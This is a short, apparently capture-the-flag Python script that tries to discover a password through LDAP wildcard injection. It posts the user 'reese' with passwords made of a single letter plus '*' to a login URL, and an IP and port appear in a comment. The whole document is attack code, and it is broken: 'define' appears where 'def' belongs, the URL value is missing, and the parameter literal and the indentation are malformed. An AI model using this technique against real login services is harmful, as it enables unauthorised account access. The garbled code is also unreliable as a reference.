"""
Quick script to brute force ldap for password discovery 
"""
import requests 
import string
letters = list(string.ascii_lowercase)
letters.extend([i.upper() for i in letters])

url =   # 167.91.91.91:30811
itteration = ""


define bruter():
  for letter in letters:
  itteration = ""
  itteration = letter + "*"
  parms = {'username:reese', 'password':itteration}
  x = requests.post(url, data = parms)
  print(x.url)
  print(x.text)
  
